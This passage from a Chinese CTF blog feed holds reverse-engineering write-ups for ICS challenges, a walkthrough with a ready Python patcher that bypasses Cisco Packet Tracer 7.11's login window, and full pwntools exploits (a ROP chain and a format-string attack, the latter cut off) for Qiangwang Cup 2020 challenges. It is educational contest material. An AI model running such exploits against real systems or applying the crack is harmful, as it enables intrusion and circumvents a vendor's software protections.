    <content type="html"><![CDATA[<h1 id="工控wp"><a href="#工控wp" class="headerlink" title="工控wp"></a>工控wp</h1><h2 id="ICS-8"><a href="#ICS-8" class="headerlink" title="ICS_8"></a><code>ICS_8</code></h2><p>就是一个算法的逆向。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> base64cypher_text = <span class="hljs-string">'HgoAVxEfdCRlPytBA1JSHiVOZW4VMURPcANETw=='</span>iv = struct.unpack(<span class="hljs-string">"I"</span>, <span class="hljs-string">'x1a0'</span>)[<span class="hljs-number">0</span>]<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decode</span><span class="hljs-params">(cypher_text,iv)</span>:</span>    cypher_text = base64.b64decode(cypher_text)    padding = <span class="hljs-number">4</span> - len(cypher_text) % <span class="hljs-number">4</span>    <span class="hljs-keyword">if</span> padding != <span class="hljs-number">0</span>:        cypher_text = cypher_text + <span class="hljs-string">"\x00"</span> * padding    l = cypher_text    crypher = struct.unpack(<span class="hljs-string">"I"</span>*(len(l)/<span class="hljs-number">4</span>),l)    datas = []    datas += [ decrypto(crypher[<span class="hljs-number">0</span>]) ^ iv ]    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> range(<span class="hljs-number">1</span>,len(crypher)):        datas += [decrypto(crypher[i]) ^ crypher[i<span class="hljs-number">-1</span>]]    <span class="hljs-keyword">return</span> datas<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">decrypto</span><span class="hljs-params">(data)</span>:</span>    <span class="hljs-keyword">return</span> data ^ (data &gt;&gt; <span class="hljs-number">16</span>)datas = decode(cypher_text,iv)flag = <span class="hljs-string">""</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> datas:    flag += struct.pack(<span class="hljs-string">"I"</span>,i)<span class="hljs-keyword">print</span> flag</code></pre></div><h2 id="ICS-9"><a href="#ICS-9" class="headerlink" title="ICS_9"></a><code>ICS_9</code></h2><p>解压以后是一个img，但是发现是损坏的。</p><div class="hljs"><pre><code class="hljs bash">file ./ICS_9.img./ICS_9.img: Linux rev 1.0 ext4 filesystem data, UUID=1385df22-b2ce-4b4f-858e-79ae1932ca1a (extents) (huge files)</code></pre></div><p>可以看到是ext4的文件。<br>然后可以用fsck修复一下：</p><div class="hljs"><pre><code class="hljs bash"> fsck.ext4 ./ICS_9.imge2fsck 1.42.13 (17-May-2015)ext2fs_open2: The ext2 superblock is corruptfsck.ext4: Superblock invalid, trying backup blocks..../ICS_9.img was not cleanly unmounted, check forced.Pass 1: Checking inodes, blocks, and sizesPass 2: Checking directory structurePass 3: Checking directory connectivityPass 4: Checking reference countsPass 5: Checking group summary informationFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (6789, counted=488).</span>Fix&lt;y&gt;? yesFree blocks count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#1 (2006, counted=228).</span>Fix&lt;y&gt;? yesFree blocks count wrong (8795, counted=716).Fix&lt;y&gt;? yesFree inodes count wrong <span class="hljs-keyword">for</span> group <span class="hljs-comment">#0 (1269, counted=1262).</span>Fix&lt;y&gt;? yesFree inodes count wrong (2549, counted=2542).Fix&lt;y&gt;? yes./ICS_9.img: ***** FILE SYSTEM WAS MODIFIED *****./ICS_9.img: 18/2560 files (11.1% non-contiguous), 9524/10240 blocks</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/kfnyiY.png" srcset="/img/loading.gif" alt></p><p>然后进行挂载:</p><div class="hljs"><pre><code class="hljs bash">mkdir tmp2sudo mount ICS_9.img tmp2 ; ls -larth tmp2</code></pre></div><div class="hljs"><pre><code class="hljs bash"> binwalk fil.encScan Time:     2015-03-09 15:35:08Target File:   /tmp/wu/tmp/fil.encMD5 Checksum:  cb84f2cc7d776e83ebe0bd17efa163f4Signatures:    328DECIMAL       HEXADECIMAL     DESCRIPTION--------------------------------------------------------------------------------0             0x0             OpenSSL encryption, salted, salt: 0x-6BC6193B4330E12Ecat AE54[71A3j9[\22?/+u0</code></pre></div><p>Binwalk 一下，发现enc文件是openssl加密的文件，AE5文件是关于加密算法和密钥。</p><p>但是并不知道是哪种模式的加密和密钥的长度的加密，需要写一个脚本测试。<br>这是所有的可能：</p><div class="hljs"><pre><code class="hljs bash">-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192</code></pre></div><div class="hljs"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash  </span> KEY=`cat AE5`   AES=<span class="hljs-string">"-aes-128-cbc -aes-128-cbc-hmac-sha1 -aes-128-cfb -aes-128-cfb1 -aes-128-cfb8 -aes-128-ctr -aes-128-ecb -aes-128-gcm -aes-128-ofb -aes-128-xts -aes-192-cbc -aes-192-cfb -aes-192-cfb1 -aes-192-cfb8 -aes-192-ctr -aes-192-ecb -aes-192-gcm -aes-192-ofb -aes-256-cbc -aes-256-cbc-hmac-sha1 -aes-256-cfb -aes-256-cfb1 -aes-256-cfb8 -aes-256-ctr -aes-256-ecb -aes-256-gcm -aes-256-ofb -aes-256-xts -aes128 -aes192"</span>   <span class="hljs-keyword">for</span> mode <span class="hljs-keyword">in</span> <span class="hljs-variable">$AES</span>   <span class="hljs-keyword">do</span>        openssl enc -d -<span class="hljs-keyword">in</span> fil.enc -out ./tmp3/fil<span class="hljs-string">"<span class="hljs-variable">$mode</span>"</span>.dec -k <span class="hljs-variable">$KEY</span> <span class="hljs-variable">$mode</span>   <span class="hljs-keyword">done</span></code></pre></div><div class="hljs"><pre><code class="hljs bash">sudo chmod +x ./1.shsudo sh 1.sh</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/X2q45Z.png" srcset="/img/loading.gif" alt></p><h2 id="ICS-11"><a href="#ICS-11" class="headerlink" title="ICS_11"></a><code>ICS_11</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/UypJgM.png" srcset="/img/loading.gif" alt><br>程序上来就告诉一下flag的格式，其中字符的内容是20位。<br><img src="http://qiqianyun.chumen77.xyz/uPic/SzWq5u.png" srcset="/img/loading.gif" alt><br>向下走，也会发现有20的相关判断。<br>其上方有个大小判断大于10就退出了，但是flag是20位的，明显需要patch一下：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/6BsYEl.png" srcset="/img/loading.gif" alt></p><p>然后往下分析，发现你输入的东西会跟12位的<code>nemo_pwned_n</code>进行先比较一下，<br>接着:</p><div class="hljs"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> ( v17 + v18 != 2842152358 || v18 - v17 != 989791556 )</code></pre></div><p>明显这是都需要进行满足的。<br>然后求解一下：</p><div class="hljs"><pre><code class="hljs bash">In [6]: hex(926180401)Out[6]: <span class="hljs-string">'0x37346431'</span> (v17)In [7]: hex(1915971957)Out[7]: <span class="hljs-string">'0x72336975'</span>. (v18)</code></pre></div><p>这样大数据进行判断，其实也是判断字符的，转码一下：</p><p><code>0x37346431:74d1  0x72336975 :r3iu</code><br>但是因为在内存中，其是小端序的，需要反转一下。<br>猜测flag就是<code>nemo_pwned_n1d47ui3r</code>。其长度正好就是20位。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/mDsH7W.png" srcset="/img/loading.gif" alt><br>经过验证的确是的。</p><h2 id="ICS-13"><a href="#ICS-13" class="headerlink" title="ICS_13"></a><code>ICS_13</code></h2><p><img src="http://qiqianyun.chumen77.xyz/uPic/gvE3nU.png" srcset="/img/loading.gif" alt><br>十分简单，自己输入的东西减去0x14，和<code>10445678951</code>进行一个个字节的比较，相等就ok。</p><div class="hljs"><pre><code class="hljs bash">key = <span class="hljs-string">'10445678951'</span>key = [ord(c) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> key]flag = <span class="hljs-string">''</span><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> key :    flag += chr(i+0x14)<span class="hljs-built_in">print</span>(flag)</code></pre></div><h2 id="ICS-2"><a href="#ICS-2" class="headerlink" title="ICS_2"></a><code>ICS_2</code></h2><p>先脱壳，esp定律脱壳。也可以用万能脱壳机进行脱。<br>由于给了提示，是需要找一个ip。很简单的思路就是直接找可疑ip。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OjHdLY.png" srcset="/img/loading.gif" alt></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/Y2gpgp.png" srcset="/img/loading.gif" alt></p><p>x32dbg直接断在这里，向下跟。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/2Nsxbj.png" srcset="/img/loading.gif" alt><br>发现可疑ip，提交就对了。</p><h2 id="ICS-14"><a href="#ICS-14" class="headerlink" title="ICS_14"></a><code>ICS_14</code></h2><p>程序就是很简单找到注册码。<br>邮箱可以乱输入，但是要保证<code>@</code> + <code>xx</code> + <code>.</code> + <code>xx</code></p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f3gbCC.png" srcset="/img/loading.gif" alt><br>这里有函数进行控制判断。<br>如果不对就会说，邮箱不合法。<br>接着看流程：</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/UDpOQ0.png" srcset="/img/loading.gif" alt></p><p>这块在判断一堆东西，推测就是注册码。<br>往上一看，可以看到这一条。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/zigrXA.png" srcset="/img/loading.gif" alt><br>明显是ida无法识别，其是还是一个字符串。</p><p>然后就是一个个转字符串，以v12-v27整合一下,<code>BZ9dmq4c8g9G7bAY</code>出来这个。<br>并且可以看到判断就是16位。<br>然后进行输入判断:<br><img src="http://qiqianyun.chumen77.xyz/uPic/8zufHQ.png" srcset="/img/loading.gif" alt><br>就很简单成功拿到。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
      <tag>misc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>实战去除packet tracer登陆窗口</title>
    <link href="/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/"/>
    <url>/2020/09/07/%E5%AE%9E%E6%88%98%E5%8E%BB%E9%99%A4packet%20tracer%E7%99%BB%E9%99%86%E7%AA%97%E5%8F%A3/</url>
    
    <content type="html"><![CDATA[<h1 id="实战去除思科packet-tracer登陆窗口"><a href="#实战去除思科packet-tracer登陆窗口" class="headerlink" title="实战去除思科packet tracer登陆窗口"></a>实战去除思科packet tracer登陆窗口</h1><h2 id="背景"><a href="#背景" class="headerlink" title="背景"></a>背景</h2><p>专业课开设了路由交换这门课，其中要经常使用packet tracer这个软件，但是没有注册的话，每次登陆都需要等待15s，就尝试破解一下。</p><h2 id="目标"><a href="#目标" class="headerlink" title="目标"></a>目标</h2><p>破除等待的15s，最好直接去除掉登陆窗口。但是老师上课给我们演示过，有个吾爱破解的插件是直接破解掉登陆窗口的，就直接奔着这个目标去。</p><h2 id="工具"><a href="#工具" class="headerlink" title="工具"></a>工具</h2><ul><li>win7 模拟器</li><li>packet tracer 7.11</li><li>x64dbg</li></ul><h2 id="破解过程记录"><a href="#破解过程记录" class="headerlink" title="破解过程记录"></a>破解过程记录</h2><h3 id="寻找突破口"><a href="#寻找突破口" class="headerlink" title="寻找突破口"></a>寻找突破口</h3><p>￼在弹出登陆界面时，最上方会有 <code>netacad.com Login</code>的字眼，先就选择这里作为关键字符串。<br>￼<br><img src="http://qiqianyun.chumen77.xyz/uPic/K55z1P.jpg" srcset="/img/loading.gif" alt><br>在这个exe的程序下搜索字符串。<br><img src="http://qiqianyun.chumen77.xyz/uPic/H1st15.jpg" srcset="/img/loading.gif" alt><br>端口可疑字符串对应的汇编指令。</p><p>然后开始f9一直运行，在这个<code>netacad.com Login</code>，运行其后的软件会发现，的确开启了登陆的窗口。这样就可以确定，关键处就在这里。<br><img src="http://qiqianyun.chumen77.xyz/uPic/6Hr3Tw.png" srcset="/img/loading.gif" alt><br>向下看可以看到，一些登陆失败的字符串，那就无疑是这一块的函数控制着这个登陆窗口。</p><p>向上看可以看到，有几个小跳转，和一个大跳转，然后追过去可以发现，是可以绕过这些关键函数的。那就很简单了，尝试改成<code>jmp</code> 无条件跳转一下试一试。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/f42dGL.png" srcset="/img/loading.gif" alt></p><p>然后直接运行一下，然后的确是成功了，去掉了登陆框。</p><p>然后进行保存补丁，替换主程序即可。</p><p><img src="http://qiqianyun.chumen77.xyz/uPic/OikyWs.png" srcset="/img/loading.gif" alt></p><h3 id="小总结"><a href="#小总结" class="headerlink" title="小总结"></a>小总结</h3><p>的确是找到了关键处，感觉整个过程还是很简单的，由于前人经验就是从登陆界面下手的，我也是直接跟随这个思路操作。在完工以后，尝试去搞一下15s哪里的验证，想点一下直接变为0s，可以点击确认，发现是的确麻烦也没有成功就放弃了。</p><h2 id="半自动化打补丁"><a href="#半自动化打补丁" class="headerlink" title="半自动化打补丁"></a>半自动化打补丁</h2><p>不太会写c，用python 写了打补丁的程序，确保本机有python2的运行环境。然后把脚本放在其安装路径的bin目录下，运行即可。</p><p>也可以把程序拖出来，打完补丁后替换原来的程序即可。</p><div class="hljs"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python2.7</span><span class="hljs-keyword">import</span> struct<span class="hljs-keyword">import</span> os<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">WriteFile</span><span class="hljs-params">()</span>:</span>    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>,<span class="hljs-string">'r'</span>) <span class="hljs-keyword">as</span> f:         dt = f.read()    dt = dt[:<span class="hljs-number">0x17a5245</span>]+<span class="hljs-string">'\xe9\xee\x04\x00\x00\x90'</span>+dt[<span class="hljs-number">0x17a524b</span>:]    <span class="hljs-keyword">with</span> open(<span class="hljs-string">'PacketTracer7.exe'</span>, <span class="hljs-string">'w'</span>) <span class="hljs-keyword">as</span> f:        f.write(dt)<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:WriteFile()</code></pre></div><p>针对的只是7.11。</p>]]></content>
    
    
    
    <tags>
      
      <tag>re</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>强网杯2020部分题目</title>
    <link href="/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/"/>
    <url>/2020/08/24/%E5%BC%BA%E7%BD%91%E6%9D%AF2020%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE/</url>
    
    <content type="html"><![CDATA[<h1 id="强网杯2020-部分题目"><a href="#强网杯2020-部分题目" class="headerlink" title="强网杯2020 部分题目"></a>强网杯2020 部分题目</h1><h2 id="babymessage"><a href="#babymessage" class="headerlink" title="babymessage"></a>babymessage</h2><h3 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h3><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-attr">Arch:</span>     <span class="hljs-string">amd64-64-little</span><span class="hljs-attr"> RELRO:</span>    <span class="hljs-string">Partial</span> <span class="hljs-string">RELRO</span><span class="hljs-attr"> Stack:</span>    <span class="hljs-literal">No</span> <span class="hljs-string">canary</span> <span class="hljs-string">found</span><span class="hljs-attr"> NX:</span>       <span class="hljs-string">NX</span> <span class="hljs-string">enabled</span><span class="hljs-attr"> PIE:</span>      <span class="hljs-literal">No</span> <span class="hljs-string">PIE</span> <span class="hljs-string">(0x3fe000)</span></code></pre></div><p>基本保护不算多。</p><p>是一个伪堆题。</p><h4 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h4><p>在 <code>leave_message(v1)</code>函数这里的v1上来取值就是16</p><div class="hljs"><pre><code class="hljs c">__int64 __<span class="hljs-function">fastcall <span class="hljs-title">leave_message</span><span class="hljs-params">(<span class="hljs-keyword">unsigned</span> <span class="hljs-keyword">int</span> a1)</span></span>&#123;  <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// ST14_4</span>  __int64 v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"message: "</span>);  v1 = read(<span class="hljs-number">0</span>, &amp;v3, a1);  <span class="hljs-built_in">strncpy</span>(buf, (<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *)&amp;v3, v1);  buf[v1] = <span class="hljs-number">0</span>;  <span class="hljs-built_in">puts</span>(<span class="hljs-string">"done!\n"</span>);  <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;&#125;</code></pre></div><p>进入以后可以发现，v3是只有8字节大小的，可以溢出8字节，可以覆盖到rbp。</p><h5 id="用途"><a href="#用途" class="headerlink" title="用途"></a>用途</h5><div class="hljs"><pre><code class="hljs undefined">.text:<span class="hljs-number">0000000000400985</span> ; <span class="hljs-number">22</span>:         <span class="hljs-keyword">if</span> ( v1 &gt; <span class="hljs-number">256</span> ).text:<span class="hljs-number">0000000000400985</span>                 cmp     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">000000000040098</span>C                 jle     short loc_400995.text:<span class="hljs-number">000000000040098</span>E ; <span class="hljs-number">23</span>:           v1 = <span class="hljs-number">256</span>;.text:<span class="hljs-number">000000000040098</span>E                 mov     [rbp+var_4], <span class="hljs-number">100</span>h.text:<span class="hljs-number">0000000000400995</span> ; <span class="hljs-number">24</span>:         leave_message(v1);</code></pre></div><p>在进入<code>leave_message(v1)</code>前v1有一个对于0x100大小的判断，要是v1大于0x100就给设置为0x100。这就可以实现栈溢出，进行rop。</p><p>怎么控制v1：</p><div class="hljs"><pre><code class="hljs undefined"><span class="hljs-keyword">signed</span> <span class="hljs-keyword">int</span> v1; <span class="hljs-comment">// [rsp+Ch] [rbp-4h]</span></code></pre></div><p>可以明显看到v1在rbp-4的地址，然后rbp，也可以进行溢出覆盖，覆盖到合适的地方后，保障-4后，有个int大小的大于等于0x100的值即可。</p><p>这个合适地址，可以从<code>leave_name()</code> 下手，因为其往bss段读了值。</p><div class="hljs"><pre><code class="hljs undefined">byte_6010D0[(signed <span class="hljs-built_in">int</span>)read(<span class="hljs-number">0</span>, byte_6010D0, <span class="hljs-number">4</span>uLL)] = <span class="hljs-number">0</span>;</code></pre></div><p><img src="http://qiqianyun.chumen77.xyz/uPic/8uyl03.png" srcset="/img/loading.gif" alt></p><h3 id="攻击"><a href="#攻击" class="headerlink" title="攻击"></a>攻击</h3><ul><li>构造rop链，泄漏出libc的地址，返回start，让程序重新跑起来，清理栈</li><li>再次利用，控制ret address 为<code>one_gadget</code></li></ul><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./babymessage'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">21342</span>)    libc = elf.libc    libc = ELF(<span class="hljs-string">'./libc-2.27.so'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]arae18 = <span class="hljs-number">0x3ebca0</span>s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    <span class="hljs-comment"># gdb.attach(proc.pidof(io)[0],gdbscript='b main')</span>    gdb.attach(io)    pause()pop_rdi = <span class="hljs-number">0x0000000000400ac3</span>start = <span class="hljs-number">0x04006E0</span>sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = flat([pop_rdi,elf.got[<span class="hljs-string">'__libc_start_main'</span>],elf.plt[<span class="hljs-string">'puts'</span>],start])payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)ru(<span class="hljs-string">'done!'</span>)r(<span class="hljs-number">2</span>)libc_base = uu64(r(<span class="hljs-number">6</span>)) - libc.sym[<span class="hljs-string">'__libc_start_main'</span>]info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'1'</span>)sa(<span class="hljs-string">'name'</span>,p32(<span class="hljs-number">0xffff</span>))sla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)<span class="hljs-comment"># debug()</span>payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)sa(<span class="hljs-string">'mes'</span>,payload)rec = <span class="hljs-number">0x10a45c</span> + libc_basesla(<span class="hljs-string">'choice'</span>,<span class="hljs-string">'2'</span>)rop = p64(rec)payload = p64(<span class="hljs-number">0x02000200</span>) + p64(<span class="hljs-number">0x06010D0</span>+<span class="hljs-number">4</span>)payload +=ropsa(<span class="hljs-string">'mes'</span>,payload)itr()</code></pre></div><div class="hljs"><pre><code class="hljs python">flag&#123;f4c1c2c2407055f2665dec486e7d1b16&#125;</code></pre></div><h2 id="Siri"><a href="#Siri" class="headerlink" title="Siri"></a>Siri</h2><h3 id="分析-1"><a href="#分析-1" class="headerlink" title="分析"></a>分析</h3><p>保护全开。栈上的格式化字符串漏洞，并且可以无限次触发。</p><h4 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h4><div class="hljs"><pre><code class="hljs c"><span class="hljs-keyword">signed</span> __int64 __<span class="hljs-function">fastcall <span class="hljs-title">sub_1212</span><span class="hljs-params">(<span class="hljs-keyword">const</span> <span class="hljs-keyword">char</span> *a1)</span></span>&#123;  <span class="hljs-keyword">char</span> *v2; <span class="hljs-comment">// [rsp+18h] [rbp-128h]</span>  <span class="hljs-keyword">char</span> s; <span class="hljs-comment">// [rsp+20h] [rbp-120h]</span>  <span class="hljs-keyword">unsigned</span> __int64 v4; <span class="hljs-comment">// [rsp+138h] [rbp-8h]</span>  v4 = __readfsqword(<span class="hljs-number">0x28</span>u);  v2 = <span class="hljs-built_in">strstr</span>(a1, <span class="hljs-string">"Remind me to "</span>);  <span class="hljs-keyword">if</span> ( !v2 )    <span class="hljs-keyword">return</span> <span class="hljs-number">0L</span>L;  <span class="hljs-built_in">memset</span>(&amp;s, <span class="hljs-number">0</span>, <span class="hljs-number">0x110</span>uLL);  <span class="hljs-built_in">sprintf</span>(&amp;s, <span class="hljs-string">"&gt;&gt;&gt; OK, I'll remind you to %s"</span>, v2 + <span class="hljs-number">13</span>);  <span class="hljs-built_in">printf</span>(&amp;s);  <span class="hljs-built_in">puts</span>(&amp;::s);  <span class="hljs-keyword">return</span> <span class="hljs-number">1L</span>L;&#125;</code></pre></div><p>发现存在格式化字符串，但是你所输入的都会被sprintf处理以后给printf函数。由于其是<code>%s</code>来处理数据，这就让直接在栈上写地址，然后攻击造成了难度。<br>但是调试可以发现，其实输入的东西还会保留在栈上，因为sprintf处理数据也是从栈上拿的，所以会被保留的。</p><h4 id="攻击-1"><a href="#攻击-1" class="headerlink" title="攻击"></a>攻击</h4><ul><li>第一次触发，泄漏出libc地址，stack地址。</li><li>执行到printf准备触发格式化字符串漏洞时，用sprintf残留栈上的数据（在0x100后），这个需要精心构造好后，进行攻击ret address。需要一次性改好。</li></ul><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><div class="hljs"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<span class="hljs-keyword">import</span> timelocal_file  = <span class="hljs-string">'./pwn'</span>elf = ELF(local_file)context.log_level = <span class="hljs-string">'debug'</span>debug = <span class="hljs-number">0</span><span class="hljs-keyword">if</span> debug:    io = process(local_file)    libc = elf.libc<span class="hljs-keyword">else</span>:    io = remote(<span class="hljs-string">'123.56.170.202'</span>,<span class="hljs-number">12124</span>)    <span class="hljs-comment"># libc = elf.libc</span>    libc = ELF(<span class="hljs-string">'./libc.so.6'</span>)context.arch = elf.archcontext.terminal = [<span class="hljs-string">'tmux'</span>,<span class="hljs-string">'neww'</span>]<span class="hljs-comment">#,''splitw','-h'</span>rce16 = [<span class="hljs-number">0x45216</span>,<span class="hljs-number">0x4526a</span>,<span class="hljs-number">0xf02a4</span>,<span class="hljs-number">0xf1147</span>]rce18 = [<span class="hljs-number">0x4f2c5</span>,<span class="hljs-number">0x4f322</span>,<span class="hljs-number">0x10a38c</span>]s      = <span class="hljs-keyword">lambda</span> data               :io.send(data) sa      = <span class="hljs-keyword">lambda</span> delim,data         :io.sendafter(delim, data)sl      = <span class="hljs-keyword">lambda</span> data               :io.sendline(data)sla     = <span class="hljs-keyword">lambda</span> delim,data         :io.sendlineafter(delim, data)r      = <span class="hljs-keyword">lambda</span> numb=<span class="hljs-number">4096</span>          :io.recv(numb)ru      = <span class="hljs-keyword">lambda</span> delims, drop=<span class="hljs-literal">True</span>  :io.recvuntil(delims, drop)uu32    = <span class="hljs-keyword">lambda</span> data               :u32(data.ljust(<span class="hljs-number">4</span>, <span class="hljs-string">'\0'</span>))uu64    = <span class="hljs-keyword">lambda</span> data               :u64(data.ljust(<span class="hljs-number">8</span>, <span class="hljs-string">'\0'</span>))info_addr = <span class="hljs-keyword">lambda</span> tag, addr        :io.info(tag + <span class="hljs-string">'==&gt;'</span> +<span class="hljs-string">': &#123;:#x&#125;'</span>.format(addr))itr     = <span class="hljs-keyword">lambda</span>                    :io.interactive()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">debug</span><span class="hljs-params">()</span>:</span>    gdb.attach(io)    pause()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">start_attc</span><span class="hljs-params">()</span>:</span>    sla(<span class="hljs-string">'&gt;&gt;'</span>,<span class="hljs-string">'Hey Siri!'</span>)    r()a = <span class="hljs-string">'Remind me to '</span>start_attc()payload = str(a) + <span class="hljs-string">'%83$p'</span> + <span class="hljs-string">'bbb'</span> + <span class="hljs-string">'%7$p'</span><span class="hljs-comment"># ru('&gt;&gt;&gt;')</span>s(payload)ru(<span class="hljs-string">'0x'</span>)libc_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x21b97</span>info_addr(<span class="hljs-string">'libc_base'</span>,libc_base)ru(<span class="hljs-string">'bbb0x'</span>)stack_base = int(r(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>) - <span class="hljs-number">0x150</span>info_addr(<span class="hljs-string">'stack_base'</span>,stack_base)tag = stack_base + <span class="hljs-number">0x148</span>start_attc()<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">fmt_short</span><span class="hljs-params">(prev,val,idx,byte = <span class="hljs-number">2</span>)</span>:</span>    result = <span class="hljs-string">""</span>    <span class="hljs-keyword">if</span> prev &lt; val :        result += <span class="hljs-string">"%"</span> + str(val - prev) + <span class="hljs-string">"c"</span>    <span class="hljs-keyword">elif</span> prev == val :        result += <span class="hljs-string">''</span>    <span class="hljs-keyword">else</span> :        result += <span class="hljs-string">"%"</span> + str(<span class="hljs-number">256</span>**byte - prev + val) + <span class="hljs-string">"c"</span>    result += <span class="hljs-string">"%"</span> + str(idx) + <span class="hljs-string">"$hn"</span>    <span class="hljs-keyword">return</span> resultprev = <span class="hljs-number">27</span>fmtpayload = <span class="hljs-string">""</span>key = <span class="hljs-number">0x4f365</span> + libc_baseinfo_addr(<span 